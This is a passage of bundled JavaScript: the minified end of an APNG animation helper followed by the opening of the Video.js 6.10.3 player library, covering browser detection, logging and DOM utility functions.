String.fromCharCode.apply(String,r)},d=function(t){return[t>>>24&255,t>>>16&255,t>>>8&255,255&t]},p=function(t){for(var e=[],n=0;n<t.length;n++)e.push(t.charCodeAt(n));return e},A=function(t,e){var n=t.length+e.length,r=new Uint8Array(new ArrayBuffer(n+8));r.set(d(e.length),0),r.set(p(t),4),r.set(e,8);var i=o(r,4,n);return r.set(d(i),n+4),r}},{"./animation":3,"./crc32":4,"es6-promise":1}],8:[function(t,e,n){(function(n){"use strict";var r=r||t("es6-promise").Promise,i=function(t){var e=null;return function(n){return e||(e=new r(t)),n&&e.then(n),e}},o=i(function(t){var e=document.createElement("canvas"),r={TypedArrays:"ArrayBuffer"in n,BlobURLs:"URL"in n,requestAnimationFrame:"requestAnimationFrame"in n,pageProtocol:"http:"==location.protocol||"https:"==location.protocol,canvas:"getContext"in document.createElement("canvas"),APNG:!1};if(r.canvas){var i=new Image;i.onload=function(){var n=e.getContext("2d");n.drawImage(i,0,0),r.APNG=0===n.getImageData(0,0,1,1).data[3],t(r)},i.src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACGFjVEwAAAABAAAAAcMq2TYAAAANSURBVAiZY2BgYPgPAAEEAQB9ssjfAAAAGmZjVEwAAAAAAAAAAQAAAAEAAAAAAAAAAAD6A+gBAbNU+2sAAAARZmRBVAAAAAEImWNgYGBgAAAABQAB6MzFdgAAAABJRU5ErkJggg=="}else t(r)}),a=function(t){return"undefined"==typeof t&&(t=!1),o().then(function(e){if(e.APNG&&!t)reject();else{var n=!0;for(var r in e)e.hasOwnProperty(r)&&"APNG"!=r&&(n=n&&e[r])}})};e.exports={checkNativeFeatures:o,ifNeeded:a}}).call(this,"undefined"!=typeof self?self:"undefined"!=typeof window?window:{})},{"es6-promise":1}]},{},[5]);
/**
 * @license
 * Video.js 6.10.3 <http://videojs.com/>
 * Copyright Brightcove, Inc. <https://www.brightcove.com/>
 * Available under Apache License Version 2.0
 * <https://github.com/videojs/video.js/blob/master/LICENSE>
 *
 * Includes vtt.js <https://github.com/mozilla/vtt.js>
 * Available under Apache License Version 2.0
 * <https://github.com/mozilla/vtt.js/blob/master/LICENSE>
 */

(function (global, factory) {
	typeof exports === 'object' && typeof module !== 'undefined' ? module.exports = factory() :
	typeof define === 'function' && define.amd ? define(factory) :
	(global.videojs = factory());
}(this, (function () {

var version = "6.10.3";

var commonjsGlobal = typeof window !== 'undefined' ? window : typeof global !== 'undefined' ? global : typeof self !== 'undefined' ? self : {};





function createCommonjsModule(fn, module) {
	return module = { exports: {} }, fn(module, module.exports), module.exports;
}

var win;

if (typeof window !== "undefined") {
    win = window;
} else if (typeof commonjsGlobal !== "undefined") {
    win = commonjsGlobal;
} else if (typeof self !== "undefined"){
    win = self;
} else {
    win = {};
}

var window_1 = win;

var empty = {};


var empty$1 = (Object.freeze || Object)({
	'default': empty
});

var minDoc = ( empty$1 && empty ) || empty$1;

var topLevel = typeof commonjsGlobal !== 'undefined' ? commonjsGlobal :
    typeof window !== 'undefined' ? window : {};


var doccy;

if (typeof document !== 'undefined') {
    doccy = document;
} else {
    doccy = topLevel['__GLOBAL_DOCUMENT_CACHE@4'];

    if (!doccy) {
        doccy = topLevel['__GLOBAL_DOCUMENT_CACHE@4'] = minDoc;
    }
}

var document_1 = doccy;

/**
 * @file browser.js
 * @module browser
 */
var USER_AGENT = window_1.navigator && window_1.navigator.userAgent || '';
var webkitVersionMap = /AppleWebKit\/([\d.]+)/i.exec(USER_AGENT);
var appleWebkitVersion = webkitVersionMap ? parseFloat(webkitVersionMap.pop()) : null;

/*
 * Device is an iPhone
 *
 * @type {Boolean}
 * @constant
 * @private
 */
var IS_IPAD = /iPad/i.test(USER_AGENT);

// The Facebook app's UIWebView identifies as both an iPhone and iPad, so
// to identify iPhones, we need to exclude iPads.
// http://artsy.github.io/blog/2012/10/18/the-perils-of-ios-user-agent-sniffing/
var IS_IPHONE = /iPhone/i.test(USER_AGENT) && !IS_IPAD;
var IS_IPOD = /iPod/i.test(USER_AGENT);
var IS_IOS = IS_IPHONE || IS_IPAD || IS_IPOD;

var IOS_VERSION = function () {
  var match = USER_AGENT.match(/OS (\d+)_/i);

  if (match && match[1]) {
    return match[1];
  }
  return null;
}();

var IS_ANDROID = /Android/i.test(USER_AGENT);
var ANDROID_VERSION = function () {
  // This matches Android Major.Minor.Patch versions
  // ANDROID_VERSION is Major.Minor as a Number, if Minor isn't available, then only Major is returned
  var match = USER_AGENT.match(/Android (\d+)(?:\.(\d+))?(?:\.(\d+))*/i);

  if (!match) {
    return null;
  }

  var major = match[1] && parseFloat(match[1]);
  var minor = match[2] && parseFloat(match[2]);

  if (major && minor) {
    return parseFloat(match[1] + '.' + match[2]);
  } else if (major) {
    return major;
  }
  return null;
}();

// Old Android is defined as Version older than 2.3, and requiring a webkit version of the android browser
var IS_OLD_ANDROID = IS_ANDROID && /webkit/i.test(USER_AGENT) && ANDROID_VERSION < 2.3;
var IS_NATIVE_ANDROID = IS_ANDROID && ANDROID_VERSION < 5 && appleWebkitVersion < 537;

var IS_FIREFOX = /Firefox/i.test(USER_AGENT);
var IS_EDGE = /Edge/i.test(USER_AGENT);
var IS_CHROME = !IS_EDGE && /Chrome/i.test(USER_AGENT);
var CHROME_VERSION = function () {
  var match = USER_AGENT.match(/Chrome\/(\d+)/);

  if (match && match[1]) {
    return parseFloat(match[1]);
  }
  return null;
}();
var IS_IE8 = /MSIE\s8\.0/.test(USER_AGENT);
var IE_VERSION = function () {
  var result = /MSIE\s(\d+)\.\d/.exec(USER_AGENT);
  var version = result && parseFloat(result[1]);

  if (!version && /Trident\/7.0/i.test(USER_AGENT) && /rv:11.0/.test(USER_AGENT)) {
    // IE 11 has a different user agent string than other IE versions
    version = 11.0;
  }

  return version;
}();

var IS_SAFARI = /Safari/i.test(USER_AGENT) && !IS_CHROME && !IS_ANDROID && !IS_EDGE;
var IS_ANY_SAFARI = IS_SAFARI || IS_IOS;

var TOUCH_ENABLED = isReal() && ('ontouchstart' in window_1 || window_1.DocumentTouch && window_1.document instanceof window_1.DocumentTouch);

var BACKGROUND_SIZE_SUPPORTED = isReal() && 'backgroundSize' in window_1.document.createElement('video').style;

var browser = (Object.freeze || Object)({
	IS_IPAD: IS_IPAD,
	IS_IPHONE: IS_IPHONE,
	IS_IPOD: IS_IPOD,
	IS_IOS: IS_IOS,
	IOS_VERSION: IOS_VERSION,
	IS_ANDROID: IS_ANDROID,
	ANDROID_VERSION: ANDROID_VERSION,
	IS_OLD_ANDROID: IS_OLD_ANDROID,
	IS_NATIVE_ANDROID: IS_NATIVE_ANDROID,
	IS_FIREFOX: IS_FIREFOX,
	IS_EDGE: IS_EDGE,
	IS_CHROME: IS_CHROME,
	CHROME_VERSION: CHROME_VERSION,
	IS_IE8: IS_IE8,
	IE_VERSION: IE_VERSION,
	IS_SAFARI: IS_SAFARI,
	IS_ANY_SAFARI: IS_ANY_SAFARI,
	TOUCH_ENABLED: TOUCH_ENABLED,
	BACKGROUND_SIZE_SUPPORTED: BACKGROUND_SIZE_SUPPORTED
});

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) {
  return typeof obj;
} : function (obj) {
  return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj;
};











var classCallCheck = function (instance, Constructor) {
  if (!(instance instanceof Constructor)) {
    throw new TypeError("Cannot call a class as a function");
  }
};











var inherits = function (subClass, superClass) {
  if (typeof superClass !== "function" && superClass !== null) {
    throw new TypeError("Super expression must either be null or a function, not " + typeof superClass);
  }

  subClass.prototype = Object.create(superClass && superClass.prototype, {
    constructor: {
      value: subClass,
      enumerable: false,
      writable: true,
      configurable: true
    }
  });
  if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass;
};











var possibleConstructorReturn = function (self, call) {
  if (!self) {
    throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
  }

  return call && (typeof call === "object" || typeof call === "function") ? call : self;
};











var taggedTemplateLiteralLoose = function (strings, raw) {
  strings.raw = raw;
  return strings;
};

/**
 * @file obj.js
 * @module obj
 */

/**
 * @callback obj:EachCallback
 *
 * @param {Mixed} value
 *        The current key for the object that is being iterated over.
 *
 * @param {string} key
 *        The current key-value for object that is being iterated over
 */

/**
 * @callback obj:ReduceCallback
 *
 * @param {Mixed} accum
 *        The value that is accumulating over the reduce loop.
 *
 * @param {Mixed} value
 *        The current key for the object that is being iterated over.
 *
 * @param {string} key
 *        The current key-value for object that is being iterated over
 *
 * @return {Mixed}
 *         The new accumulated value.
 */
var toString = Object.prototype.toString;

/**
 * Get the keys of an Object
 *
 * @param {Object}
 *        The Object to get the keys from
 *
 * @return {string[]}
 *         An array of the keys from the object. Returns an empty array if the
 *         object passed in was invalid or had no keys.
 *
 * @private
 */
var keys = function keys(object) {
  return isObject(object) ? Object.keys(object) : [];
};

/**
 * Array-like iteration for objects.
 *
 * @param {Object} object
 *        The object to iterate over
 *
 * @param {obj:EachCallback} fn
 *        The callback function which is called for each key in the object.
 */
function each(object, fn) {
  keys(object).forEach(function (key) {
    return fn(object[key], key);
  });
}

/**
 * Array-like reduce for objects.
 *
 * @param {Object} object
 *        The Object that you want to reduce.
 *
 * @param {Function} fn
 *         A callback function which is called for each key in the object. It
 *         receives the accumulated value and the per-iteration value and key
 *         as arguments.
 *
 * @param {Mixed} [initial = 0]
 *        Starting value
 *
 * @return {Mixed}
 *         The final accumulated value.
 */
function reduce(object, fn) {
  var initial = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 0;

  return keys(object).reduce(function (accum, key) {
    return fn(accum, object[key], key);
  }, initial);
}

/**
 * Object.assign-style object shallow merge/extend.
 *
 * @param  {Object} target
 * @param  {Object} ...sources
 * @return {Object}
 */
function assign(target) {
  for (var _len = arguments.length, sources = Array(_len > 1 ? _len - 1 : 0), _key = 1; _key < _len; _key++) {
    sources[_key - 1] = arguments[_key];
  }

  if (Object.assign) {
    return Object.assign.apply(Object, [target].concat(sources));
  }

  sources.forEach(function (source) {
    if (!source) {
      return;
    }

    each(source, function (value, key) {
      target[key] = value;
    });
  });

  return target;
}

/**
 * Returns whether a value is an object of any kind - including DOM nodes,
 * arrays, regular expressions, etc. Not functions, though.
 *
 * This avoids the gotcha where using `typeof` on a `null` value
 * results in `'object'`.
 *
 * @param  {Object} value
 * @return {Boolean}
 */
function isObject(value) {
  return !!value && (typeof value === 'undefined' ? 'undefined' : _typeof(value)) === 'object';
}

/**
 * Returns whether an object appears to be a "plain" object - that is, a
 * direct instance of `Object`.
 *
 * @param  {Object} value
 * @return {Boolean}
 */
function isPlain(value) {
  return isObject(value) && toString.call(value) === '[object Object]' && value.constructor === Object;
}

/**
 * @file log.js
 * @module log
 */
var log = void 0;

// This is the private tracking variable for logging level.
var level = 'info';

// This is the private tracking variable for the logging history.
var history = [];

/**
 * Log messages to the console and history based on the type of message
 *
 * @private
 * @param  {string} type
 *         The name of the console method to use.
 *
 * @param  {Array} args
 *         The arguments to be passed to the matching console method.
 *
 * @param  {boolean} [stringify]
 *         By default, only old IEs should get console argument stringification,
 *         but this is exposed as a parameter to facilitate testing.
 */
var logByType = function logByType(type, args) {
  var stringify = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : !!IE_VERSION && IE_VERSION < 11;

  var lvl = log.levels[level];
  var lvlRegExp = new RegExp('^(' + lvl + ')$');

  if (type !== 'log') {

    // Add the type to the front of the message when it's not "log".
    args.unshift(type.toUpperCase() + ':');
  }

  // Add a clone of the args at this point to history.
  if (history) {
    history.push([].concat(args));
  }

  // Add console prefix after adding to history.
  args.unshift('VIDEOJS:');

  // If there's no console then don't try to output messages, but they will
  // still be stored in history.
  if (!window_1.console) {
    return;
  }

  // Was setting these once outside of this function, but containing them
  // in the function makes it easier to test cases where console doesn't exist
  // when the module is executed.
  var fn = window_1.console[type];

  if (!fn && type === 'debug') {
    // Certain browsers don't have support for console.debug. For those, we
    // should default to the closest comparable log.
    fn = window_1.console.info || window_1.console.log;
  }

  // Bail out if there's no console or if this type is not allowed by the
  // current logging level.
  if (!fn || !lvl || !lvlRegExp.test(type)) {
    return;
  }

  // IEs previous to 11 log objects uselessly as "[object Object]"; so, JSONify
  // objects and arrays for those less-capable browsers.
  if (stringify) {
    args = args.map(function (a) {
      if (isObject(a) || Array.isArray(a)) {
        try {
          return JSON.stringify(a);
        } catch (x) {
          return String(a);
        }
      }

      // Cast to string before joining, so we get null and undefined explicitly
      // included in output (as we would in a modern console).
      return String(a);
    }).join(' ');
  }

  // Old IE versions do not allow .apply() for console methods (they are
  // reported as objects rather than functions).
  if (!fn.apply) {
    fn(args);
  } else {
    fn[Array.isArray(args) ? 'apply' : 'call'](window_1.console, args);
  }
};

/**
 * Logs plain debug messages. Similar to `console.log`.
 *
 * @class
 * @param    {Mixed[]} args
 *           One or more messages or objects that should be logged.
 */
log = function log() {
  for (var _len = arguments.length, args = Array(_len), _key = 0; _key < _len; _key++) {
    args[_key] = arguments[_key];
  }

  logByType('log', args);
};

/**
 * Enumeration of available logging levels, where the keys are the level names
 * and the values are `|`-separated strings containing logging methods allowed
 * in that logging level. These strings are used to create a regular expression
 * matching the function name being called.
 *
 * Levels provided by video.js are:
 *
 * - `off`: Matches no calls. Any value that can be cast to `false` will have
 *   this effect. The most restrictive.
 * - `all`: Matches only Video.js-provided functions (`debug`, `log`,
 *   `log.warn`, and `log.error`).
 * - `debug`: Matches `log.debug`, `log`, `log.warn`, and `log.error` calls.
 * - `info` (default): Matches `log`, `log.warn`, and `log.error` calls.
 * - `warn`: Matches `log.warn` and `log.error` calls.
 * - `error`: Matches only `log.error` calls.
 *
 * @type {Object}
 */
log.levels = {
  all: 'debug|log|warn|error',
  off: '',
  debug: 'debug|log|warn|error',
  info: 'log|warn|error',
  warn: 'warn|error',
  error: 'error',
  DEFAULT: level
};

/**
 * Get or set the current logging level. If a string matching a key from
 * {@link log.levels} is provided, acts as a setter. Regardless of argument,
 * returns the current logging level.
 *
 * @param  {string} [lvl]
 *         Pass to set a new logging level.
 *
 * @return {string}
 *         The current logging level.
 */
log.level = function (lvl) {
  if (typeof lvl === 'string') {
    if (!log.levels.hasOwnProperty(lvl)) {
      throw new Error('"' + lvl + '" in not a valid log level');
    }
    level = lvl;
  }
  return level;
};

/**
 * Returns an array containing everything that has been logged to the history.
 *
 * This array is a shallow clone of the internal history record. However, its
 * contents are _not_ cloned; so, mutating objects inside this array will
 * mutate them in history.
 *
 * @return {Array}
 */
log.history = function () {
  return history ? [].concat(history) : [];
};

/**
 * Clears the internal history tracking, but does not prevent further history
 * tracking.
 */
log.history.clear = function () {
  if (history) {
    history.length = 0;
  }
};

/**
 * Disable history tracking if it is currently enabled.
 */
log.history.disable = function () {
  if (history !== null) {
    history.length = 0;
    history = null;
  }
};

/**
 * Enable history tracking if it is currently disabled.
 */
log.history.enable = function () {
  if (history === null) {
    history = [];
  }
};

/**
 * Logs error messages. Similar to `console.error`.
 *
 * @param {Mixed[]} args
 *        One or more messages or objects that should be logged as an error
 */
log.error = function () {
  for (var _len2 = arguments.length, args = Array(_len2), _key2 = 0; _key2 < _len2; _key2++) {
    args[_key2] = arguments[_key2];
  }

  return logByType('error', args);
};

/**
 * Logs warning messages. Similar to `console.warn`.
 *
 * @param {Mixed[]} args
 *        One or more messages or objects that should be logged as a warning.
 */
log.warn = function () {
  for (var _len3 = arguments.length, args = Array(_len3), _key3 = 0; _key3 < _len3; _key3++) {
    args[_key3] = arguments[_key3];
  }

  return logByType('warn', args);
};

/**
 * Logs debug messages. Similar to `console.debug`, but may also act as a comparable
 * log if `console.debug` is not available
 *
 * @param {Mixed[]} args
 *        One or more messages or objects that should be logged as debug.
 */
log.debug = function () {
  for (var _len4 = arguments.length, args = Array(_len4), _key4 = 0; _key4 < _len4; _key4++) {
    args[_key4] = arguments[_key4];
  }

  return logByType('debug', args);
};

var log$1 = log;

function clean (s) {
  return s.replace(/\n\r?\s*/g, '')
}


var tsml = function tsml (sa) {
  var s = ''
    , i = 0;

  for (; i < arguments.length; i++)
    s += clean(sa[i]) + (arguments[i + 1] || '');

  return s
};

/**
 * @file computed-style.js
 * @module computed-style
 */
/**
 * A safe getComputedStyle with an IE8 fallback.
 *
 * This is needed because in Firefox, if the player is loaded in an iframe with
 * `display:none`, then `getComputedStyle` returns `null`, so, we do a null-check to
 * make sure  that the player doesn't break in these cases.
 *
 * @param {Element} el
 *        The element you want the computed style of
 *
 * @param {string} prop
 *        The property name you want
 *
 * @see https://bugzilla.mozilla.org/show_bug.cgi?id=548397
 *
 * @static
 * @const
 */
function computedStyle(el, prop) {
  if (!el || !prop) {
    return '';
  }

  if (typeof window_1.getComputedStyle === 'function') {
    var cs = window_1.getComputedStyle(el);

    return cs ? cs[prop] : '';
  }

  return el.currentStyle[prop] || '';
}

var _templateObject = taggedTemplateLiteralLoose(['Setting attributes in the second argument of createEl()\n                has been deprecated. Use the third argument instead.\n                createEl(type, properties, attributes). Attempting to set ', ' to ', '.'], ['Setting attributes in the second argument of createEl()\n                has been deprecated. Use the third argument instead.\n                createEl(type, properties, attributes). Attempting to set ', ' to ', '.']);

/**
 * @file dom.js
 * @module dom
 */
/**
 * Detect if a value is a string with any non-whitespace characters.
 *
 * @param {string} str
 *        The string to check
 *
 * @return {boolean}
 *         - True if the string is non-blank
 *         - False otherwise
 *
 */
function isNonBlankString(str) {
  return typeof str === 'string' && /\S/.test(str);
}

/**
 * Throws an error if the passed string has whitespace. This is used by
 * class methods to be relatively consistent with the classList API.
 *
 * @param {string} str
 *         The string to check for whitespace.
 *
 * @throws {Error}
 *         Throws an error if there is whitespace in the string.
 *
 */
function throwIfWhitespace(str) {
  if (/\s/.test(str)) {
    throw new Error('class has illegal whitespace characters');
  }
}

/**
 * Produce a regular expression for matching a className within an elements className.
 *
 * @param {string} className
 *         The className to generate the RegExp for.
 *
 * @return {RegExp}
 *         The RegExp that will check for a specific `className` in an elements
 *         className.
 */
function classRegExp(className) {
  return new RegExp('(^|\\s)' + className + '($|\\s)');
}

/**
 * Whether the current DOM interface appears to be real.
 *
 * @return {Boolean}
 */
function isReal() {
  return (

    // Both document and window will never be undefined thanks to `global`.
    document_1 === window_1.document &&

    // In IE < 9, DOM methods return "object" as their type, so all we can
    // confidently check is that it exists.
    typeof document_1.createElement !== 'undefined'
  );
}

/**
 * Determines, via duck typing, whether or not a value is a DOM element.
 *
 * @param {Mixed} value
 *        The thing to check
 *
 * @return {boolean}
 *         - True if it is a DOM element
 *         - False otherwise
 */
function isEl(value) {
  return isObject(value) && value.nodeType === 1;
}

/**
 * Determines if the current DOM is embedded in an iframe.
 *
 * @return {boolean}
 *
 */
function isInFrame() {

  // We need a try/catch here because Safari will throw errors when attempting
  // to get either `parent` or `self`
  try {
    return window_1.parent !== window_1.self;
  } catch (x) {
    return true;
  }
}

/**
 * Creates functions to query the DOM using a given method.
 *
 * @param {string} method
 *         The method to create the query with.
 *
 * @return {Function}
 *         The query method
 */
function createQuerier(method) {
  return function (selector, context) {
    if (!isNonBlankString(selector)) {
      return document_1[method](null);
    }
    if (isNonBlankString(context)) {
      context = document_1.querySelector(context);
    }

    var ctx = isEl(context) ? context : document_1;

    return ctx[method] && ctx[method](selector);
  };
}

/**
 * Creates an element and applies properties.
 *
 * @param {string} [tagName='div']
 *         Name of tag to be created.
 *
 * @param {Object} [properties={}]
 *         Element properties to be applied.
 *
 * @param {Object} [attributes={}]
 *         Element attributes to be applied.
 *
 * @param {String|Element|TextNode|Array|Function} [content]
 *         Contents for the element (see: {@link dom:normalizeContent})
 *
 * @return {Element}
 *         The element that was created.
 */
function createEl() {
  var tagName = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 'div';
  var properties = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};
  var attributes = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : {};
  var content = arguments[3];

  var el = document_1.createElement(tagName);

  Object.getOwnPropertyNames(properties).forEach(function (propName) {
    var val = properties[propName];

    // See #2176
    // We originally were accepting both properties and attributes in the
    // same object, but that doesn't work so well.
    if (propName.indexOf('aria-') !== -1 || propName === 'role' || propName === 'type') {
      log$1.warn(tsml(_templateObject, propName, val));
      el.setAttribute(propName, val);

      // Handle textContent since it's not supported everywhere and we have a
      // method for it.
    } else if (propName === 'textContent') {
      textContent(el, val);
    } else {
      el[propName] = val;
    }
  });

  Object.getOwnPropertyNames(attributes).forEach(function (attrName) {
    el.setAttribute(attrName, attributes[attrName]);
  });

  if (content) {
    appendContent(el, content);
  }

  return el;
}

/**
 * Injects text into an element, replacing any existing contents entirely.
 *
 * @param {Element} el
 *        The element to add text content into
 *
 * @param {string} text
 *        The text content to add.
 *
 * @return {Element}
 *         The element with added text content.
 */
function textContent(el, text) {
  if (typeof el.textContent === 'undefined') {
    el.innerText = text;
  } else {
    el.textContent = text;
  }
  return el;
}

/**
 * Insert an element as the first child node of another
 *
 * @param {Element} child
 *        Element to insert
 *
 * @param {Element} parent
 *        Element to insert child into
 */
function prependTo(child, parent) {
  if (parent.firstChild) {
    parent.insertBefore(child, parent.firstChild);
  } else {
    parent.appendChild(child);
  }
}

/**
 * Check if an element has a CSS class
 *
 * @param {Element} element
 *        Element to check
 *
 * @param {string} classToCheck
 *        Class name to check for
 *
 * @return {boolean}
 *         - True if the element had the class
 *         - False otherwise.
 *
 * @throws {Error}
 *         Throws an error if `classToCheck` has white space.
 */
function hasClass(element, classToCheck) {
  throwIfWhitespace(classToCheck);
  if (element.classList) {
    return element.classList.contains(classToCheck);
  }
  return classRegExp(classToCheck).test(element.className);
}

/**
 * Add a CSS class name to an element
 *
 * @param {Element} element
 *        Element to add class name to.
 *
 * @param {string} classToAdd
 *        Class name to add.
 *
 * @return {Element}
 *         The dom element with the added class name.
 */
function addClass(element, classToAdd) {
  if (element.classList) {
    element.classList.add(classToAdd);

    // Don't need to `throwIfWhitespace` here because `hasElClass` will do it
    // in the case of classList not being supported.
  } else if (!hasClass(element, classToAdd)) {
    element.className = (element.className + ' ' + classToAdd).trim();
  }

  return element;
}

/**
 * Remove a CSS class name from an element
 *
 * @param {Element} element
 *        Element to remove a class name from.
 *
 * @param {string} classToRemove
 *        Class name to remove
 *
 * @return {Element}
 *         The dom element with class name removed.
 */
function removeClass(element, classToRemove) {
  if (element.classList) {
    element.classList.remove(classToRemove);
  } else {
    throwIfWhitespace(classToRemove);
    element.className = element.className.split(/\s+/).filter(function (c) {
      return c !== classToRemove;
    }).join(' ');
  }

  return element;
}

/**
 * The callback definition for toggleElClass.
 *
 * @callback Dom~PredicateCallback
 * @param {Element} element
 *        The DOM element of the Component.
 *
 * @param {string} classToToggle
 *        The `className` that wants to be toggled
 *
 * @return {boolean|undefined}
 *         - If true the `classToToggle` will get added to `element`.
 *         - If false the `classToToggle` will get removed from `element`.
 *         - If undefined this callback will be ignored
 */

/**
 * Adds or removes a CSS class name on an element depending on an optional
 * condition or the presence/absence of the class name.
 *
 * @param {Element} element
 *        The element to toggle a class name on.
 *
 * @param {string} classToToggle
 *        The class that should be toggled
 *
 * @param {boolean|PredicateCallback} [predicate]
 *        See the return value for {@link Dom~PredicateCallback}
 *
 * @return {Element}
 *         The element with a class that has been toggled.
 */
function toggleClass(element, classToToggle, predicate) {

  // This CANNOT use `classList` internally because IE does not support the
  // second parameter to the `classList.toggle()` method! Which is fine because
  // `classList` will be used by the add/remove functions.
  var has = hasClass(element, classToToggle);

  if (typeof predicate === 'function') {
    predicate = predicate(element, classToToggle);
  }

  if (typeof predicate !== 'boolean') {
    predicate = !has;
  }

  // If the necessary class operation matches the current state of the
  // element, no action is required.
  if (predicate === has) {
    return;
  }

  if (predicate) {
    addClass(element, classToToggle);
  } else {
    removeClass(element, classToToggle);
  }

  return element;
}

/**
 * Apply attributes to an HTML element.
 *
 * @param {Element} el
 *        Element to add attributes to.
 *
 * @param {Object} [attributes]
 *        Attributes to be applied.
 */
function setAttributes(el, attributes) {
  Object.getOwnPropertyNames(attributes).forEach(function (attrName) {
    var attrValue = attributes[attrName];

    if (attrValue === null || typeof attrValue === 'undefined' || attrValue === false) {
      el.removeAttribute(attrName);
    } else {
      el.setAttribute(attrName, attrValue === true ? '' : attrValue);
    }
  });
}

/**
 * Get an element's attribute values, as defined on the HTML tag
 * Attributes are not the same as properties. They're defined on the tag
 * or with setAttribute (which shouldn't be used with HTML)
 * This will return true or false for boolean attributes.
 *
 * @param {Element} tag
 *        Element from which to get tag attributes.
 *
 * @return {Object}
 *         All attributes of the element.
 */
function getAttributes(tag) {
  var obj = {};

  // known boolean attributes
  // we can check for matching boolean properties, but older browsers
  // won't know about HTML5 boolean attributes that we still read from
  var knownBooleans = ',' + 'autoplay,controls,playsinline,loop,muted,default,defaultMuted' + ',';

  if (tag && tag.attributes && tag.attributes.length > 0) {
    var attrs = tag.attributes;

    for (var i = attrs.length - 1; i >= 0; i--) {
      var attrName = attrs[i].name;
      var attrVal = attrs[i].value;

      // check for known booleans
      // the matching element property will return a value for typeof
      if (typeof tag[attrName] === 'boolean' || knownBooleans.indexOf(',' + attrName + ',') !== -1) {
        // the value of an included boolean attribute is typically an empty
        // string ('') which would equal false if we just check for a false value.
        // we also don't want support bad code like autoplay='false'
        attrVal = attrVal !== null ? true : false;
      }

      obj[attrName] = attrVal;
    }
  }

  return obj;
}

/**
 * Get the value of an element's attribute
 *
 * @param {Element} el
 *        A DOM element
 *
 * @param {string} attribute
 *        Attribute to get the value of
 *
 * @return {string}
 *         value of the attribute
 */
function getAttribute(el, attribute) {
  return el.getAttribute(attribute);
}

/**
 * Set the value of an element's attribute
 *
 * @param {Element} el
 *        A DOM element
 *
 * @param {string} attribute
 *        Attribute to set
 *
 * @param {string} value
 *        Value to set the attribute to
 */
function setAttribute(el, attribute, value) {
  el.setAttribute(attribute, value);
}

/**
 * Remove an element's attribute
 *
 * @param {Element} el
 *        A DOM element
 *
 * @param {string} attribute
 *        Attribute to remove
 */
function removeAttribute(el, attribute) {
  el.removeAttribute(attribute);
}

/**
 * Attempt to block the ability to select text while dragging controls
 */
function blockTextSelection() {
  document_1.body.focus();
  document_1.onselectstart = function () {
    return false;
  };
}

/**
 * Turn off text selection blocking
 */
function unblockTextSelection() {
  document_1.onselectstart = function () {
    return true;
  };
}

/**
 * Identical to the native `getBoundingClientRect` function, but ensures that
 * the method is supported at all (it is in all browsers we claim to support)
 * and that the element is in the DOM before continuing.
 *
 * This wrapper function also shims properties which are not provided by some
 * older browsers (namely, IE8).
 *
 * Additionally, some browsers do not support adding properties to a
 * `ClientRect`/`DOMRect` object; so, we shallow-copy it with the standard
 * properties (except `x` and `y` which are not widely supported). This helps
 * avoid implementations where keys are non-enumerable.
 *
 * @param  {Element} el
 *         Element whose `ClientRect` we want to calculate.
 *
 * @return {Object|undefined}
 *         Always returns a plain
 */
function getBoundingClientRect(el) {
  if (el && el.getBoundingClientRect && el.parentNode) {
    var rect = el.getBoundingClientRect();
    var result = {};

    ['bottom', 'height', 'left', 'right', 'top', 'width'].forEach(function (k) {
      if (rect[k] !== undefined) {
        result[k] = rect[k];
      }
    });

    if (!result.height) {
      result.height = parseFloat(computedStyle(el, 'height'));
    }

    if (!result.width) {
      result.width = parseFloat(computedStyle(el, 'width'));
    }

    return result;
  }
}

/**
 * The postion of a DOM element on the page.
 *
 * @typedef {Object} module:dom~Position
 *
 * @property {number} left
 *           Pixels to the left
 *
 * @property {number} top
 *           Pixels on top
 */

/**
 * Offset Left.
 * getBoundingClientRect technique from
 * John Resig
 *
 * @see http://ejohn.org/blog/getboundingclientrect-is-awesome/
 *
 * @param {Element} el
 *        Element from which to get offset
 *
 * @return {module:dom~Position}
 *         The position of the element that was passed in.
 */
function findPosition(el) {
  var box = void 0;

  if (el.getBoundingClientRect && el.parentNode) {
    box = el.getBoundingClientRect();
  }

  if (!box) {
    return {
      left: 0,
      top: 0
    };
  }

  var docEl = document_1.documentElement;
  var body = document_1.body;

  var clientLeft = docEl.clientLeft || body.clientLeft || 0;
  var scrollLeft = window_1.pageXOffset || body.scrollLeft;
  var left = box.left + scrollLeft - clientLeft;

  var clientTop = docEl.clientTop || body.clientTop || 0;
  var scrollTop = window_1.pageYOffset || body.scrollTop;
  var top = box.top + scrollTop - clientTop;

  // Android sometimes returns slightly off decimal values, so need to round
  return {
    left: Math.round(left),
    top: Math.round(top)
  };
}

/**
 * x and y coordinates for a dom element or mouse pointer
 *
 * @typedef {Object} Dom~Coordinates
 *
 * @property {number} x
 *           x coordinate in pixels
 *
 * @property {number} y
 *           y coordinate in pixels
 */

/**
 * Get pointer position in element
 * Returns an object with x and y coordinates.
 * The base on the coordinates are the bottom left of the element.
 *
 * @param {Element} el
 *        Element on which to get the pointer position on
 *
 * @param {EventTarget~Event} event
 *        Event object
 *
 * @return {Dom~Coordinates}
 *         A Coordinates object corresponding to the mouse position.
 *
 */
function getPointerPosition(el, event) {
  var position = {};
  var box = findPosition(el);
  var boxW = el.offsetWidth;
  var boxH = el.offsetHeight;

  var boxY = box.top;
  var boxX = box.left;
  var pageY = event.pageY;
  var pageX = event.pageX;

  if (event.changedTouches) {
    pageX = event.changedTouches[0].pageX;
    pageY = event.changedTouches[0].pageY;
  }

  position.y = Math.max(0, Math.min(1, (boxY - pageY + boxH) / boxH));
  position.x = Math.max(0, Math.min(1, (pageX - boxX) / boxW));

  return position;
}

/**
 * Determines, via duck typing, whether or not a value is a text node.
 *
 * @param {Mixed} value
 *        Check if this value is a text node.
 *
 * @return {boolean}
 *         - True if it is a text node
 *         - False otherwise
 */
function isTextNode(value) {
  return isObject(value) && value.nodeType === 3;
}

/**
